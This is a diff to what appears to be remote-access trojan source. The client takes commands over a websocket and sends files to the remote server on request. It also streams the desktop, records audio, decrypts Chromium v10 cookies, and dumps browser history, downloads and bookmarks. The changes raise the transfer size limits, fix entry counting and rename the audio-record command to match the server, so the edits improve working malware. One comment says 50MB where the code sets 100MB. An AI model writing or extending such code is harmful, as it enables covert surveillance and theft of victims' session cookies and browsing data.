@@ -76,9 +76,9 @@ async def handle_file_get(filepath: str) -> str:
         if not path.is_file():
             return f"FILE_ERROR:Not a file: {path}"
         
-        # Size limit (10MB)
-        if path.stat().st_size > 10 * 1024 * 1024:
-            return f"FILE_ERROR:File too large (max 10MB): {path}"
+        # Size limit (50MB)
+        if path.stat().st_size > 50 * 1024 * 1024:
+            return f"FILE_ERROR:File too large (max 50MB): {path}"
         
         with open(path, 'rb') as f:
             file_data = f.read()
@@ -2349,9 +2349,6 @@ if ($result.ReturnValue -eq 0) {{
                                                     # Check version prefix
                                                     version = encrypted_value[:3]
                                                     
-                                                    # Debug: print first few bytes
-                                                    # print(f"[DEBUG] Cookie encryption version bytes: {version.hex()} = {version}")
-                                                    
                                                     if version == b'v10':
                                                         # AES-256-GCM decryption for v10
                                                         from Crypto.Cipher import AES
@@ -2566,6 +2563,8 @@ if ($result.ReturnValue -eq 0) {{
                                                 indent = "  " * bm.get('level', 0)
                                                 f.write(f"{i}. {indent}{bm['name']}\n")
                                                 f.write(f"   {indent}URL: {bm['url']}\n\n")
+                                            # FIX 3: count bookmarks written to file
+                                            file_entries_count += len(all_bookmarks)
                                         except:
                                             pass
                                     
@@ -2583,7 +2582,9 @@ if ($result.ReturnValue -eq 0) {{
                                                 ORDER BY last_visit_time DESC
                                             ''')
                                             
-                                            for i, row in enumerate(cursor.fetchall(), 1):
+                                            # FIX 2: fetch into variable so we can count rows
+                                            rows = cursor.fetchall()
+                                            for i, row in enumerate(rows, 1):
                                                 timestamp_val = row[3] / 1000000 - 11644473600 if row[3] else 0
                                                 date_str = datetime.fromtimestamp(timestamp_val).strftime('%Y-%m-%d %H:%M:%S') if timestamp_val > 0 else 'Unknown'
                                                 
@@ -2591,6 +2592,7 @@ if ($result.ReturnValue -eq 0) {{
                                                 f.write(f"   URL: {row[0]}\n")
                                                 f.write(f"   Visits: {row[2]}, Last Visit: {date_str}\n\n")
                                             
+                                            file_entries_count += len(rows)
                                             conn.close()
                                             os.remove(temp_db)
                                         except:
@@ -2793,7 +2795,9 @@ if ($result.ReturnValue -eq 0) {{
                                                 ORDER BY start_time DESC
                                             ''')
                                             
-                                            for i, row in enumerate(cursor.fetchall(), 1):
+                                            # FIX 4: fetch into variable so we can count rows
+                                            rows = cursor.fetchall()
+                                            for i, row in enumerate(rows, 1):
                                                 timestamp_val = row[3] / 1000000 - 11644473600 if row[3] else 0
                                                 date_str = datetime.fromtimestamp(timestamp_val).strftime('%Y-%m-%d %H:%M:%S') if timestamp_val > 0 else 'Unknown'
                                                 size_mb = row[2] / (1024 * 1024) if row[2] else 0
@@ -2803,6 +2807,7 @@ if ($result.ReturnValue -eq 0) {{
                                                 f.write(f"   Size: {size_mb:.2f} MB\n")
                                                 f.write(f"   Date: {date_str}\n\n")
                                             
+                                            file_entries_count += len(rows)
                                             conn.close()
                                             os.remove(temp_db)
                                         except:
@@ -3584,7 +3589,7 @@ async def main():
                 uri,
                 ssl=ssl_context,
                 ping_interval=None,
-                max_size=10_000_000  # 10MB pour les fichiers
+                max_size=100_000_000  # 50MB limit for files
             ) as websocket:
                 
                 # Authentication
@@ -3674,8 +3679,9 @@ async def main():
                             response = await desktop_streamer.stop_stream()
                             await websocket.send(response)
                         
-                        elif command.startswith("RECORD_AUDIO:"):
-                            # Format: RECORD_AUDIO:duration
+                        # FIX 1: changed from "RECORD_AUDIO:" to "AUDIO_RECORD:" to match client/server
+                        elif command.startswith("AUDIO_RECORD:"):
+                            # Format: AUDIO_RECORD:duration
                             duration_str = command.split(":", 1)[1]
                             try:
                                 duration = int(duration_str)
